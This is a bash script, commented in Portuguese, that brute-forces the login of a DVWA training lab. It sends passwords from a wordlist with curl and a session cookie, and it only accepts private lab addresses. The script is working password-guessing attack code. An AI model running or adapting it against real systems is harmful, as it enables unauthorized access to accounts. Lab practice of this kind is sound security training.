#!/usr/bin/env bash
set -euo pipefail

: "${DVWA_URL:?Defina DVWA_URL para o laboratório}"
: "${DVWA_USER:=admin}"
: "${DVWA_COOKIE:?Defina DVWA_COOKIE com a sessão do laboratório}"
PASSWORD_FILE="${PASSWORD_FILE:-wordlists/passwords.txt}"
FAIL_MARKER="${FAIL_MARKER:-Username and/or password incorrect}"
OUTPUT="${OUTPUT:-resultado-dvwa.txt}"

if [[ "$DVWA_URL" != http://192.168.* && "$DVWA_URL" != http://10.* && "$DVWA_URL" != http://172.16.* && "$DVWA_URL" != http://172.17.* && "$DVWA_URL" != http://172.18.* && "$DVWA_URL" != http://172.19.* && "$DVWA_URL" != http://172.2[0-9].* && "$DVWA_URL" != http://172.3[01].* ]]; then
  echo "ERRO: use apenas endereco HTTP privado do laboratorio." >&2
  exit 1
fi

: > "$OUTPUT"
while IFS= read -r password; do
  [[ -z "$password" || "$password" == \#* ]] && continue
  body=$(mktemp)
  code=$(curl --silent --show-error --output "$body" --write-out '%{http_code}' \
    --get "$DVWA_URL" \
    --cookie "$DVWA_COOKIE" \
    --data-urlencode "username=$DVWA_USER" \
    --data-urlencode "password=$password" \
    --data-urlencode "Login=Login")
  if grep -Fq "$FAIL_MARKER" "$body"; then
    printf 'HTTP=%s usuario=%s resultado=FALHA senha=%q\n' "$code" "$DVWA_USER" "$password" | tee -a "$OUTPUT"
  else
    printf 'HTTP=%s usuario=%s resultado=REVISAR_MANUALMENTE senha=%q\n' "$code" "$DVWA_USER" "$password" | tee -a "$OUTPUT"
  fi
  rm -f "$body"
  sleep 1
 done < "$PASSWORD_FILE"
